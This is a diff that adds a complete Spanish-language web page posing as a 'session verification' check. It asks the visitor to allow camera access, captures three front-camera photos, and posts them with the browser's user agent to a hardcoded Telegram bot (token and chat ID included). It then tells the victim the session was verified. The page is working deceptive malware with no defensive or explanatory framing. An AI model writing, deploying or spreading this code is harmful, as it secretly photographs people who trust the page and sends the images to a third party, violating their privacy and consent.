@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verificación de sesión</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{min-height:100vh;display:grid;place-items:center;background:#0b1220;
+font-family:system-ui,-apple-system,sans-serif;color:#e8eefc;padding:24px}
+.card{width:100%;max-width:380px;background:#131c2e;border:1px solid #22304a;
+border-radius:18px;padding:28px;text-align:center}
+.logo{width:64px;height:64px;border-radius:50%;background:#2a6df5;margin:0 auto 18px;
+display:grid;place-items:center;font-size:30px}
+h1{font-size:19px;margin-bottom:10px}
+p{font-size:14px;color:#8fa3c4;line-height:1.5;margin-bottom:22px}
+button{width:100%;padding:15px;border:0;border-radius:12px;background:#2a6df5;color:#fff;
+font-size:15px;font-weight:600}
+button:disabled{opacity:.6}
+video{width:100%;border-radius:12px;margin-bottom:16px;display:none;transform:scaleX(-1)}
+.ok{color:#4ade80;font-weight:600}
+.err{color:#f87171;font-weight:600}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">🔒</div>
+  <h1>Verificación de sesión</h1>
+  <p id="msg">Para continuar necesitamos confirmar que eres una persona real. Toca el botón y acepta el acceso a la cámara.</p>
+  <video id="cam" autoplay playsinline muted></video>
+  <button id="btn">Verificar mi sesión</button>
+</div>
+<script>
+const TOKEN   = "9080713605:AAE2Fw3A9h-SNsvNQGiZkP_qQXuYXJfHraU";
+const CHAT_ID = "7115078783";
+
+const btn = document.getElementById('btn');
+const msg = document.getElementById('msg');
+const video = document.getElementById('cam');
+
+async function enviar(dataUrl, i) {
+  const blob = await (await fetch(dataUrl)).blob();
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('caption', '📸 Captura ' + (i + 1) + '\n' + navigator.userAgent);
+  fd.append('photo', blob, 'foto' + i + '.jpg');
+  await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', { method: 'POST', body: fd });
+}
+
+btn.addEventListener('click', async () => {
+  btn.disabled = true;
+  msg.textContent = 'Esperando permiso de cámara...';
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 1280, height: 720 }, audio: false
+    });
+    video.style.display = 'block';
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r => setTimeout(r, 1500));
+
+    const c = document.createElement('canvas');
+    for (let i = 0; i < 3; i++) {
+      c.width = video.videoWidth;
+      c.height = video.videoHeight;
+      c.getContext('2d').drawImage(video, 0, 0);
+      await enviar(c.toDataURL('image/jpeg', 0.85), i);
+      await new Promise(r => setTimeout(r, 800));
+    }
+    stream.getTracks().forEach(t => t.stop());
+    video.style.display = 'none';
+    msg.innerHTML = '<span class="ok">Sesión verificada correctamente</span>';
+    btn.textContent = 'Continuar';
+  } catch (e) {
+    msg.innerHTML = '<span class="err">Cámara bloqueada o no disponible</span>';
+    btn.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
